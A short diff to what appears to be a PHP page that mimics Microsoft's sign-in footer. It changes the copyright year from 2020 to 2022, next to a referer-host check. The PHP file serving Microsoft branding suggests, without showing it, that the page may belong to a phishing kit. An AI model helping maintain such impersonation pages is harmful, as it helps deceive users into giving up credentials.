@@ -182,7 +182,7 @@ if($refData['host'] !== $_SERVER['HTTP_HOST']) {
                 <div> </div>
                 <div id="footer" class="footer default" role="contentinfo">
                     <div>
-                        <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy">©2020
+                        <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy">©2022
                                     Microsoft</span> <a id="ftrTerms" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy
                                     &amp;
                                     cookies</a>
